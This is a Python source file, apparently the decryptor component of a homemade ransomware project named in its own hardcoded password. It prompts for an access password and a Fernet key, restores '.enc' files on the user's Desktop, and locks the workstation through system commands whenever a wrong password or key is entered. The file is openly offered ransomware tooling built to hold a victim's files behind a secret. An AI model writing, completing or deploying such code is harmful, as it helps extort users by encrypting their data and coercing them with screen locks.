import os
import platform
from cryptography.fernet import Fernet

ACCESS_PASSWORD = "4MyRansomeware1234"

def lock_screen():
    system = platform.system()

    if system == "Windows":
        os.system("rundll32.exe user32.dll,LockWorkStation")
    elif system == "Linux":
        os.system("gnome-screensaver-command -l || dm-tool lock || loginctl lock-session")
    elif system == "Darwin":  # macOS
        os.system('/System/Library/CoreServices/"Menu Extras"/User.menu/Contents/Resources/CGSession -suspend')
    else:
        print("Unsupported OS for lock screen.")

def decrypt_file(filepath, fernet):
    with open(filepath, "rb") as file:
        encrypted = file.read()
    decrypted = fernet.decrypt(encrypted)
    original_path = filepath.replace(".enc", "")
    with open(original_path, "wb") as dec_file:
        dec_file.write(decrypted)
    os.remove(filepath)

def decrypt_desktop():
    user_password = input("Enter decryption access password: ")
    if user_password != ACCESS_PASSWORD:
        print("❌ Wrong password. Locking screen...")
        lock_screen()
        return

    try:
        key_input = input("Enter the key from secret.key: ").strip()
        fernet = Fernet(key_input.encode())
    except Exception as e:
        print("❌ Invalid key. Locking screen...")
        lock_screen()
        return

    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    print("[*] Decrypting files on your desktop...")

    for root, _, files in os.walk(desktop_path):
        for file in files:
            if file.endswith(".enc"):
                enc_path = os.path.join(root, file)
                try:
                    decrypt_file(enc_path, fernet)
                    print(f"[+] Decrypted: {enc_path}")
                except Exception as e:
                    print(f"[!] Failed to decrypt {enc_path}: {e}")

    print("[*] All files decrypted.")

if __name__ == "__main__":
    decrypt_desktop()
